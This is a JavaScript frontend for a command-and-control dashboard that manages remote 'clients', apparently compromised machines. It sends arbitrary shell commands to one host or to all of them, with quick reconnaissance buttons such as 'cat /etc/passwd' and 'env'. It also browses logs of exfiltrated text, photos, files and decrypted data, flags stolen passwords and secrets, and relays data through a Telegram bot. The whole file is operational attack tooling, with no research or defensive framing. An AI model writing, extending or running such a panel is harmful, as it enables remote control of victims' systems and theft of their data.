/* ═══════════════════════════════════════════════════════════════
   C2 Dashboard — Frontend Logic
   ═══════════════════════════════════════════════════════════════ */

// ── App state ────────────────────────────────────────────────────────────
const S = {
  view:       "overview",
  clients:    {},
  logs:       [],
  cmdHistory: [],
  stats:      {},
  logFilter:  "all",
  logSearch:  "",
};

// ── API helpers ──────────────────────────────────────────────────────────
const api = {
  // Always include the dashboard key so protected endpoints accept the request.
  // DASHBOARD_KEY is injected into the page by Flask (see index.html).
  _h(extra = {}) {
    return {
      "Content-Type": "application/json",
      "X-Dashboard-Key": window.DASHBOARD_KEY || "",
      ...extra,
    };
  },
  async get(path) {
    const r = await fetch(path, { headers: this._h() });
    if (!r.ok) throw new Error(`${r.status}`);
    return r.json();
  },
  async post(path, body = {}) {
    const r = await fetch(path, {
      method: "POST",
      headers: this._h(),
      body: JSON.stringify(body),
    });
    try { return await r.json(); } catch { return {}; }
  },
  async del(path) {
    const r = await fetch(path, { method: "DELETE", headers: this._h() });
    try { return await r.json(); } catch { return {}; }
  },
};

// ── Toast ────────────────────────────────────────────────────────────────
function toast(msg, kind = "info") {
  const icons = { ok: "✅", err: "❌", info: "ℹ️", warn: "⚠️" };
  const el = document.createElement("div");
  el.className = `toast ${kind}`;
  el.innerHTML = `<span>${icons[kind] || "ℹ️"}</span><span>${esc(msg)}</span>`;
  document.getElementById("toast-wrap").appendChild(el);
  setTimeout(() => el.remove(), 3600);
}

// ── Modal ────────────────────────────────────────────────────────────────
function openModal(html) {
  document.getElementById("modal-body").innerHTML = html;
  document.getElementById("modal-overlay").classList.remove("hidden");
}
function closeModal() {
  document.getElementById("modal-overlay").classList.add("hidden");
}

// ── Navigation ───────────────────────────────────────────────────────────
const VIEW_TITLES = {
  overview: "Overview",
  clients:  "Connected Clients",
  commands: "Command Center",
  logs:     "Logs Viewer",
  files:    "File Analysis",
  telegram: "Telegram",
};

function navigate(view) {
  S.view = view;
  document.querySelectorAll(".nav-link").forEach(
    el => el.classList.toggle("active", el.dataset.view === view)
  );
  document.getElementById("page-title").textContent = VIEW_TITLES[view] || view;
  renderView(view);
}

function renderView(view) {
  ({ overview, clients, commands, logs, files, telegram })[view]?.();
}

// ── Utilities ────────────────────────────────────────────────────────────
function esc(s) {
  return String(s ?? "")
    .replace(/&/g, "&amp;").replace(/</g, "&lt;")
    .replace(/>/g, "&gt;").replace(/"/g, "&quot;");
}

function trunc(s, n = 100) {
  s = String(s ?? "");
  return s.length > n ? s.slice(0, n) + "…" : s;
}

function fmtTime(ts) {
  if (!ts) return "—";
  return new Date(ts * 1000).toLocaleTimeString();
}

function timeSince(ts) {
  if (!ts) return "Never";
  const s = Math.floor(Date.now() / 1000 - ts);
  if (s < 60)   return `${s}s ago`;
  if (s < 3600) return `${Math.floor(s / 60)}m ago`;
  if (s < 86400)return `${Math.floor(s / 3600)}h ago`;
  return `${Math.floor(s / 86400)}d ago`;
}

function typeBadge(t) {
  const map = {
    text: "b-blue", photo: "b-purple", file: "b-yellow",
    telegram: "b-blue", handshake: "b-green", decrypted: "b-green",
    plain: "b-gray", command: "b-red", unknown: "b-gray",
  };
  return `<span class="badge ${map[t] || "b-gray"}">${esc(t || "?")}</span>`;
}

function clientStatusBadge(ts) {
  if (!ts) return `<span class="badge b-gray">Unknown</span>`;
  const s = Date.now() / 1000 - ts;
  if (s < 120)  return `<span class="badge b-green">Online</span>`;
  if (s < 600)  return `<span class="badge b-yellow">Idle</span>`;
  return `<span class="badge b-red">Offline</span>`;
}

function empty(icon, msg) {
  return `<div class="empty"><i class="${icon}"></i><p>${msg}</p></div>`;
}

// ── Data fetchers ────────────────────────────────────────────────────────
async function fetchAll() {
  await Promise.all([fetchStats(), fetchClients(), fetchLogs()]);
}
async function fetchStats()   { try { S.stats   = await api.get("/api/stats");            } catch { S.stats   = {}; } }
async function fetchClients() { try { S.clients = await api.get("/api/clients");          } catch { S.clients = {}; } }
async function fetchLogs()    { try { S.logs    = await api.get("/api/logs");             } catch { S.logs    = []; } }
async function fetchCmdHist() { try { S.cmdHistory = await api.get("/api/commands/history"); } catch { S.cmdHistory = []; } }

async function updateStatusBar() {
  // C2 server health
  try {
    const h = await api.get("/api/health");
    const alive = h && !h.error;
    document.getElementById("dot-c2").className    = `dot ${alive ? "online" : "offline"}`;
    document.getElementById("c2-label").textContent = alive ? "C2 Online" : "C2 Offline";
  } catch {
    document.getElementById("dot-c2").className    = "dot offline";
    document.getElementById("c2-label").textContent = "C2 Offline";
  }

  // Process statuses
  try {
    const st = await api.get("/api/processes/status");
    document.getElementById("dot-server").className = `dot ${st.server === "running" ? "running" : "stopped"}`;
    document.getElementById("dot-bot").className    = `dot ${st.bot    === "running" ? "running" : "stopped"}`;
  } catch { /* ignore */ }
}

// ── VIEW: OVERVIEW ───────────────────────────────────────────────────────
async function overview() {
  await fetchAll();
  const st = S.stats;
  const cCount = Object.keys(S.clients).length;

  document.getElementById("view-content").innerHTML = `

    <div class="stats-grid">
      <div class="stat-card">
        <div class="stat-icon text-blue"><i class="fa-solid fa-laptop"></i></div>
        <div class="stat-label">Total Clients</div>
        <div class="stat-value">${st.total_clients ?? cCount}</div>
      </div>
      <div class="stat-card">
        <div class="stat-icon text-green"><i class="fa-solid fa-file-lines"></i></div>
        <div class="stat-label">Total Logs</div>
        <div class="stat-value">${st.total_logs ?? S.logs.length}</div>
      </div>
      <div class="stat-card">
        <div class="stat-icon text-yellow"><i class="fa-solid fa-bolt"></i></div>
        <div class="stat-label">Pending Commands</div>
        <div class="stat-value">${st.pending_commands ?? 0}</div>
      </div>
      <div class="stat-card">
        <div class="stat-icon text-yellow" style="color:var(--purple)"><i class="fa-solid fa-clock"></i></div>
        <div class="stat-label">Server Uptime</div>
        <div class="stat-value" style="font-size:1.1rem">${st.server_uptime ?? "—"}</div>
      </div>
      <div class="stat-card">
        <div class="stat-icon" style="color:var(--orange)"><i class="fa-brands fa-telegram"></i></div>
        <div class="stat-label">Bot Status</div>
        <div class="stat-value" style="font-size:1rem;padding-top:4px">
          <span class="badge ${st.bot_status === "running" ? "b-green" : "b-red"}">${st.bot_status ?? "Unknown"}</span>
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-header"><span class="card-title">Control Panel</span></div>
      <div class="actions-grid">
        <div class="action-tile" onclick="startProcess('server')">
          <i class="fa-solid fa-play text-green"></i>Start C2 Server
        </div>
        <div class="action-tile" onclick="stopProcess('server')">
          <i class="fa-solid fa-stop text-red"></i>Stop C2 Server
        </div>
        <div class="action-tile" onclick="startProcess('bot')">
          <i class="fa-brands fa-telegram text-blue"></i>Start Bot
        </div>
        <div class="action-tile" onclick="stopProcess('bot')">
          <i class="fa-solid fa-stop text-red"></i>Stop Bot
        </div>
        <div class="action-tile" onclick="restartAll()">
          <i class="fa-solid fa-arrows-rotate text-yellow"></i>Restart All
        </div>
        <div class="action-tile" onclick="exportLogs()">
          <i class="fa-solid fa-download text-blue"></i>Export Logs
        </div>
        <div class="action-tile" onclick="clearLogs()">
          <i class="fa-solid fa-trash text-red"></i>Clear Logs
        </div>
        <div class="action-tile" onclick="navigate('telegram')">
          <i class="fa-solid fa-paper-plane text-blue"></i>Send Telegram
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <span class="card-title">Recent Activity</span>
        <button class="btn btn-ghost btn-sm" onclick="navigate('logs')">View all →</button>
      </div>
      ${_recentLogsHtml(6)}
    </div>`;
}

function _recentLogsHtml(n) {
  const rows = [...S.logs].reverse().slice(0, n);
  if (!rows.length) return empty("fa-solid fa-inbox", "No activity yet");
  return rows.map(l => `
    <div class="log-row">
      <span class="log-time">${fmtTime(l.timestamp)}</span>
      <span class="log-type">${typeBadge(l.type)}</span>
      <span class="log-data">${esc(trunc(String(l.data ?? ""), 90))}</span>
      <span class="log-client">${esc(l.client_id || l.chat_id || "")}</span>
    </div>`).join("");
}

// ── VIEW: CLIENTS ────────────────────────────────────────────────────────
async function clients() {
  await fetchClients();
  const entries = Object.entries(S.clients);

  document.getElementById("view-content").innerHTML = `
    <div class="card">
      <div class="card-header">
        <span class="card-title">Clients (${entries.length})</span>
        <button class="btn btn-ghost btn-sm" onclick="clients()">
          <i class="fa-solid fa-arrows-rotate"></i> Refresh
        </button>
      </div>
      ${entries.length === 0
        ? empty("fa-solid fa-laptop", "No clients connected yet")
        : `<div class="table-wrap"><table>
            <thead><tr>
              <th>Client ID</th><th>Last Seen</th><th>Since</th><th>Status</th><th>Action</th>
            </tr></thead>
            <tbody>
              ${entries.map(([id, info]) => `
                <tr>
                  <td><code>${esc(id)}</code></td>
                  <td class="text-muted">${esc(info.last_seen || "—")}</td>
                  <td class="text-tiny">${timeSince(info.timestamp)}</td>
                  <td>${clientStatusBadge(info.timestamp)}</td>
                  <td>
                    <button class="btn btn-danger btn-sm" onclick="openCmdModal('${esc(id)}')">
                      <i class="fa-solid fa-terminal"></i> Command
                    </button>
                  </td>
                </tr>`).join("")}
            </tbody>
          </table></div>`
      }
    </div>`;
}

function openCmdModal(clientId) {
  openModal(`
    <p class="modal-title"><i class="fa-solid fa-terminal"></i> Send command to <code>${esc(clientId)}</code></p>
    <div class="form-group">
      <label>Command</label>
      <input id="mc-input" type="text" placeholder="e.g. whoami" autofocus
             onkeydown="if(event.key==='Enter') submitCmdModal('${esc(clientId)}')">
    </div>
    <button class="btn btn-danger" onclick="submitCmdModal('${esc(clientId)}')">
      <i class="fa-solid fa-paper-plane"></i> Send
    </button>`);
  setTimeout(() => document.getElementById("mc-input")?.focus(), 50);
}

async function submitCmdModal(clientId) {
  const cmd = document.getElementById("mc-input")?.value?.trim();
  if (!cmd) return toast("Enter a command", "warn");
  try {
    await api.post("/api/command", { command: cmd, client_id: clientId });
    toast(`Command sent to ${clientId}`, "ok");
    closeModal();
  } catch { toast("Failed to send command", "err"); }
}

// ── VIEW: COMMANDS ───────────────────────────────────────────────────────
async function commands() {
  await Promise.all([fetchClients(), fetchCmdHist()]);

  const opts = Object.keys(S.clients)
    .map(id => `<option value="${esc(id)}">${esc(id)}</option>`)
    .join("");

  // Linux quick commands (Kali / Ubuntu)
  const quickCmds = ["whoami","id","hostname","uname -a","ip a","ifconfig","netstat -tulnp","ps aux","ls -la","cat /etc/passwd","env","w"];

  document.getElementById("view-content").innerHTML = `
    <div class="grid-2">
      <div class="card">
        <div class="card-header"><span class="card-title">Send Command</span></div>
        <div class="form-group">
          <label>Target Client</label>
          <select id="cc-client">
            <option value="all">All Clients</option>${opts}
          </select>
        </div>
        <div class="form-group">
          <label>Command</label>
          <input id="cc-cmd" type="text" placeholder="whoami / dir / ipconfig"
                 onkeydown="if(event.key==='Enter') submitCmd()">
        </div>
        <button class="btn btn-danger" onclick="submitCmd()">
          <i class="fa-solid fa-paper-plane"></i> Send Command
        </button>
      </div>

      <div class="card">
        <div class="card-header"><span class="card-title">Quick Commands</span></div>
        <div style="display:grid;grid-template-columns:1fr 1fr;gap:7px">
          ${quickCmds.map(c =>
            `<button class="btn btn-ghost btn-sm" onclick="setCmd('${c}')">${c}</button>`
          ).join("")}
        </div>
      </div>
    </div>

    <div class="card">
      <div class="card-header">
        <span class="card-title">Command History (${S.cmdHistory.length})</span>
        <button class="btn btn-ghost btn-sm" onclick="commands()">
          <i class="fa-solid fa-arrows-rotate"></i>
        </button>
      </div>
      ${S.cmdHistory.length === 0
        ? empty("fa-solid fa-history", "No commands yet")
        : `<div class="table-wrap"><table>
            <thead><tr><th>#</th><th>Command</th><th>Client</th><th>Status</th><th>Time</th></tr></thead>
            <tbody>
              ${S.cmdHistory.map(c => `
                <tr>
                  <td class="text-tiny">${c.id}</td>
                  <td><code>${esc(c.command)}</code></td>
                  <td class="text-muted">${esc(c.client_id || "all")}</td>
                  <td><span class="badge ${c.status === "pending" ? "b-yellow" : "b-green"}">${esc(c.status)}</span></td>
                  <td class="text-tiny">${esc(c.created_at || "—")}</td>
                </tr>`).join("")}
            </tbody>
          </table></div>`
      }
    </div>`;
}

function setCmd(cmd) {
  const el = document.getElementById("cc-cmd");
  if (el) { el.value = cmd; el.focus(); }
}

async function submitCmd() {
  const cmd = document.getElementById("cc-cmd")?.value?.trim();
  const cid = document.getElementById("cc-client")?.value;
  if (!cmd) return toast("Enter a command first", "warn");
  try {
    await api.post("/api/command", { command: cmd, client_id: cid });
    toast(`Command "${trunc(cmd, 30)}" sent to ${cid}`, "ok");
    document.getElementById("cc-cmd").value = "";
    setTimeout(commands, 400);
  } catch { toast("Failed to send command", "err"); }
}

// ── VIEW: LOGS ───────────────────────────────────────────────────────────
async function logs() {
  await fetchLogs();
  const types = ["all","text","photo","file","telegram","handshake","decrypted","plain"];

  document.getElementById("view-content").innerHTML = `
    <div class="card">
      <div class="card-header">
        <span class="card-title">Logs (${S.logs.length})</span>
        <div class="flex gap-8 items-center">
          <div class="search-wrap">
            <i class="fa-solid fa-search"></i>
            <input type="text" id="log-search" placeholder="Search…"
                   oninput="S.logSearch=this.value;_renderLogRows()">
          </div>
          <button class="btn btn-ghost btn-sm" onclick="logs()">
            <i class="fa-solid fa-arrows-rotate"></i>
          </button>
        </div>
      </div>

      <div class="filter-bar" id="filter-bar">
        ${types.map(t => `
          <button class="filter-btn ${S.logFilter === t ? "active" : ""}"
                  onclick="setLogFilter('${t}')">${t}</button>`).join("")}
      </div>

      <div id="log-rows">${_logRowsHtml()}</div>
    </div>`;
}

function setLogFilter(f) {
  S.logFilter = f;
  document.querySelectorAll(".filter-btn")
    .forEach(b => b.classList.toggle("active", b.textContent === f));
  _renderLogRows();
}

function _renderLogRows() {
  const el = document.getElementById("log-rows");
  if (el) el.innerHTML = _logRowsHtml();
}

function _logRowsHtml() {
  let rows = [...S.logs].reverse();
  if (S.logFilter !== "all") rows = rows.filter(l => l.type === S.logFilter);
  if (S.logSearch) {
    const q = S.logSearch.toLowerCase();
    rows = rows.filter(l =>
      String(l.data ?? "").toLowerCase().includes(q) ||
      String(l.client_id ?? "").toLowerCase().includes(q) ||
      String(l.type ?? "").toLowerCase().includes(q)
    );
  }
  if (!rows.length) return empty("fa-solid fa-search", "No logs match your filter");
  return rows.map(l => `
    <div class="log-row">
      <span class="log-time">${fmtTime(l.timestamp)}</span>
      <span class="log-type">${typeBadge(l.type)}</span>
      <span class="log-data">${esc(trunc(String(l.data ?? ""), 130))}</span>
      <span class="log-client">${esc(l.client_id || l.chat_id || "")}</span>
    </div>`).join("");
}

// ── VIEW: FILES ──────────────────────────────────────────────────────────
async function files() {
  await fetchLogs();
  const fileEntries = S.logs.filter(l => l.type === "photo" || l.type === "file");

  document.getElementById("view-content").innerHTML = `
    <div class="card">
      <div class="card-header">
        <span class="card-title">Uploaded Files (${fileEntries.length})</span>
      </div>
      ${fileEntries.length === 0
        ? empty("fa-solid fa-folder-open", "No files uploaded yet")
        : `<div class="table-wrap"><table>
            <thead><tr><th>Time</th><th>Type</th><th>Data / Path</th><th>Client</th><th>Analyze</th></tr></thead>
            <tbody>
              ${fileEntries.map((f, i) => `
                <tr>
                  <td class="text-tiny">${fmtTime(f.timestamp)}</td>
                  <td>${typeBadge(f.type)}</td>
                  <td><code>${esc(trunc(String(f.data ?? ""), 65))}</code></td>
                  <td class="text-muted">${esc(f.client_id || "—")}</td>
                  <td>
                    <button class="btn btn-ghost btn-sm" onclick="analyzeFile(${i})">
                      <i class="fa-solid fa-magnifying-glass-chart"></i> Analyze
                    </button>
                  </td>
                </tr>`).join("")}
            </tbody>
          </table></div>`
      }
    </div>`;
}

function analyzeFile(idx) {
  const fileEntries = S.logs.filter(l => l.type === "photo" || l.type === "file");
  const f = fileEntries[idx];
  if (!f) return;
  const report = _buildAnalysisReport(f);
  openModal(`
    <p class="modal-title"><i class="fa-solid fa-magnifying-glass-chart"></i> File Analysis</p>
    <div class="form-group">
      <label>Raw Data (truncated)</label>
      <code style="display:block;padding:8px;font-size:.8rem;word-break:break-all;max-height:80px;overflow:auto">
        ${esc(trunc(String(f.data ?? ""), 250))}
      </code>
    </div>
    <div class="form-group">
      <label>Analysis Report (simulated exiftool / strings)</label>
      <div class="analyze-out">${esc(report)}</div>
    </div>`);
}

function _buildAnalysisReport(f) {
  const data = String(f.data ?? "");
  const lines = [
    "╔══════════════════════════════════╗",
    "║     FILE ANALYSIS REPORT         ║",
    "╚══════════════════════════════════╝",
    `File type   : ${f.type}`,
    `Data length : ${data.length} chars`,
    `Client ID   : ${f.client_id || "unknown"}`,
    `Timestamp   : ${new Date((f.timestamp || 0) * 1000).toISOString()}`,
    "",
    "── EXIF (simulated) ─────────────────",
    f.type === "photo" ? "  Format      : JPEG/PNG" : "  Format      : Binary/Text",
    `  Encoding    : ${/^[A-Za-z0-9+/]+=*$/.test(data.slice(0, 100)) ? "Base64" : "Raw"}`,
    "",
    "── Strings (≥5 chars) ───────────────",
  ];

  const strings = data.replace(/[^\x20-\x7E]/g, " ")
    .split(/\s+/).filter(s => s.length >= 5).slice(0, 18);
  strings.forEach(s => lines.push(`  ${s}`));
  if (!strings.length) lines.push("  (none found)");

  lines.push("", "── Indicators ───────────────────────");
  let found = false;
  if (/https?:\/\//i.test(data))               { lines.push("  ⚠️  URL detected");          found = true; }
  if (/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(data)) { lines.push("  ⚠️  IP address detected");    found = true; }
  if (/[A-Za-z0-9+/]{50,}={0,2}/.test(data))  { lines.push("  ⚠️  Base64 blob detected");   found = true; }
  if (/password|passwd|secret/i.test(data))    { lines.push("  🔴 Sensitive keyword found"); found = true; }
  if (!found) lines.push("  ✅ No obvious indicators");

  lines.push("", "── Entropy ──────────────────────────");
  const unique = new Set(data).size;
  lines.push(`  Unique chars : ${unique}`);
  lines.push(`  Est. entropy : ${(unique / Math.max(data.length, 1) * 8).toFixed(2)} bits`);

  return lines.join("\n");
}

// ── VIEW: TELEGRAM ───────────────────────────────────────────────────────
function telegram() {
  document.getElementById("view-content").innerHTML = `
    <div class="grid-2">
      <div class="card">
        <div class="card-header"><span class="card-title">Bot Configuration</span></div>
        <div class="form-group">
          <label>Bot Token</label>
          <input id="tg-token" type="text" placeholder="123456789:AAEC…">
        </div>
        <div class="form-group">
          <label>Chat IDs (comma-separated)</label>
          <input id="tg-chats" type="text" placeholder="7604675763, -100123456…">
        </div>
        <button class="btn btn-primary" onclick="saveTgSettings()">
          <i class="fa-solid fa-floppy-disk"></i> Save Settings
        </button>
      </div>

      <div class="card">
        <div class="card-header"><span class="card-title">Broadcast Message</span></div>
        <div class="form-group">
          <label>Message text</label>
          <textarea id="tg-broadcast" rows="4" placeholder="Message to send to all configured chats…"></textarea>
        </div>
        <button class="btn btn-success" onclick="broadcastTg()">
          <i class="fa-solid fa-paper-plane"></i> Send to All Chats
        </button>
      </div>
    </div>

    <div class="card">
      <div class="card-header"><span class="card-title">Quick Test</span></div>
      <div class="form-row">
        <div class="form-group" style="margin:0;flex:1">
          <label>Test message</label>
          <input id="tg-test" type="text" value="🔔 Test from C2 Dashboard">
        </div>
        <button class="btn btn-primary" onclick="testTg()" style="align-self:flex-end">
          <i class="fa-solid fa-vial"></i> Send Test
        </button>
      </div>
    </div>`;
}

async function saveTgSettings() {
  const token  = document.getElementById("tg-token")?.value?.trim();
  const rawIds = document.getElementById("tg-chats")?.value?.trim();
  const body   = {};
  if (token)  body.token    = token;
  if (rawIds) body.chat_ids = rawIds.split(",").map(s => s.trim()).filter(Boolean);
  if (!Object.keys(body).length) return toast("Nothing to save", "warn");
  try {
    await api.post("/api/telegram/settings", body);
    toast("Telegram settings updated", "ok");
  } catch { toast("Failed to update settings", "err"); }
}

async function broadcastTg() {
  const msg = document.getElementById("tg-broadcast")?.value?.trim();
  if (!msg) return toast("Enter a message", "warn");
  try {
    await api.post("/api/telegram/send", { message: msg });
    toast("Message sent to all chats", "ok");
  } catch { toast("Failed to send message", "err"); }
}

async function testTg() {
  const msg = document.getElementById("tg-test")?.value?.trim() || "🔔 Test from C2 Dashboard";
  try {
    await api.post("/api/telegram/send", { message: msg });
    toast("Test message sent ✅", "ok");
  } catch { toast("Failed to send test message", "err"); }
}

// ── Process management ───────────────────────────────────────────────────
async function startProcess(name) {
  try {
    const r = await api.post(`/api/process/${name}/start`);
    if (r.error)  toast(`Start ${name}: ${r.error}`, "err");
    else          toast(`${name} ${r.status}`, r.status === "started" ? "ok" : "info");
    updateStatusBar();
  } catch { toast(`Error starting ${name}`, "err"); }
}

async function stopProcess(name) {
  try {
    const r = await api.post(`/api/process/${name}/stop`);
    toast(`${name}: ${r.status || "stopped"}`, "info");
    updateStatusBar();
  } catch { toast(`Error stopping ${name}`, "err"); }
}

async function restartAll() {
  toast("Restarting all services…", "info");
  await stopProcess("server");
  await stopProcess("bot");
  await new Promise(r => setTimeout(r, 1200));
  await startProcess("server");
  await startProcess("bot");
  toast("All services restarted", "ok");
}

// ── Toolbar actions ──────────────────────────────────────────────────────
function exportLogs() {
  window.open("/api/export/logs", "_blank");
  toast("Downloading logs CSV…", "info");
}

async function clearLogs() {
  if (!confirm("Delete ALL logs from the C2 server? This cannot be undone.")) return;
  try {
    await api.del("/api/clear");
    S.logs = [];
    toast("Logs cleared", "ok");
    if (S.view === "overview") overview();
    if (S.view === "logs")     logs();
  } catch { toast("Failed to clear logs", "err"); }
}

async function refresh() {
  await updateStatusBar();
  renderView(S.view);
}

// ── Init ─────────────────────────────────────────────────────────────────
document.addEventListener("DOMContentLoaded", () => {
  // Wire up sidebar nav
  document.getElementById("sidebar-nav").addEventListener("click", e => {
    const link = e.target.closest(".nav-link");
    if (link) { e.preventDefault(); navigate(link.dataset.view); }
  });

  // Close modal on overlay backdrop click
  document.getElementById("modal-overlay").addEventListener("click", e => {
    if (e.target === e.currentTarget) closeModal();
  });

  // First render
  navigate("overview");
  updateStatusBar();

  // Auto-refresh every 12 seconds
  setInterval(() => {
    updateStatusBar();
    if (["overview", "clients", "logs"].includes(S.view)) renderView(S.view);
  }, 12000);
});
